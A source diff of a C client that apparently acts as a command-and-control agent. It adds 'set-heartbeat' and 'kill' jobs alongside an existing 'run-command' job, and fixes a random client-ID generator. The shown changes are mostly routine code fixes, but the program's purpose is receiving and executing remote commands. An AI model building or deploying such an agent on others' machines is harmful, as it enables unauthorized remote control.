@@ -22,6 +22,9 @@ char * client_id_generate();
 char * decision_tree(SOCKET sock, WSADATA wsa);
 size_t decode_utf8(const char* utf8_str, char* decoded_str);
 
+//converstion functions (lifesavers btw)
+int char_to_int(char * input_str);
+
 //structs for the win... makes life easy :)
 struct connection {
     int first_connection;
@@ -197,7 +200,7 @@ char * decision_tree(SOCKET sock, WSADATA wsa) {
     
     ///// Decision tree
 
-    if ( strcmp(return_job.job, "run_command" ) == 0 ) {
+    if ( strcmp(return_job.job, "run-command" ) == 0 ) {
         printf("Run command Function \n");
         //creating space on the heap for the results
         char * command_results = malloc(1024);
@@ -219,6 +222,25 @@ char * decision_tree(SOCKET sock, WSADATA wsa) {
         return "continue";
     }
 
+    else if ( strcmp(return_job.job, "set-heartbeat" )==0) {
+        // command in this case is the time to set the heartbeat for
+
+        //easy way to put char * to str
+        //int new_heartbeat = atoi(return_job.command);
+
+        int new_heartbeat;
+        //safer way
+        new_heartbeat = char_to_int(return_job.command);
+        server_connection.heartbeat = new_heartbeat;
+
+        printf("%i\n", new_heartbeat);
+        printf("%i\n", server_connection.heartbeat);
+        return "continue";
+    }
+
+    else if ( strcmp(return_job.job, "kill" )==0) {
+        exit(0);
+    }
 
     else {
         printf("DEBUG: WAITING AS NO COMMANDS WERE RECIEVED\n");
@@ -342,28 +364,39 @@ char* run_command(char* raw_command) {
 }
 
 char * client_id_generate() {
-    /* Lol this function is terrible, need a better way for random strings
     // seed the random number generator with the current time
     srand(time(NULL));
 
-
     // adding a spot in memory for this variable, as it will vanish otherwise (on return) if not allocated
-    char* random_string = malloc(sizeof(char) * 6);
+    //mutliplying by 7 as a char is one byte
+    char* random_string = malloc(sizeof(char) * 7);
 
     //looping 5 times, and associating a number with a letter
-    for (int i = 0; i < 5; i++) {
+    for (int i = 0; i < 6; i++) {
+        /*% is moduluo, it decided the number based on the remainder of rand/26, 
+        which is never higher than the number that is dividing (26)*/
         int random_number = rand() % 26;
         random_string[i] = 'A' + random_number;
     }
-    //random_string[5] = '\0';
+    random_string[6] = '\0';
     
     // print the random string
     printf("RandoString\n");
-    printf("Random string: %i", random_string[5]);
-    */
-    
-    char * random_string = malloc(7);
-    strcpy(random_string, "FAKEID");
+    printf("Random string: %s", random_string);
+
     return random_string;
 
+}
+
+int char_to_int(char * input_str) {
+    //char* str = "12345";
+    char* endptr;
+    // strtol(ChartoConveer, check for \0 else error, and base 10)
+    int num = strtol(input_str, &endptr, 10);
+    if (*endptr != '\0') {
+    // error, input string is not a valid integer
+        printf("ERR Invalid Input string");
+    }
+    //might need to allocate some mem for this
+    return num;
 }
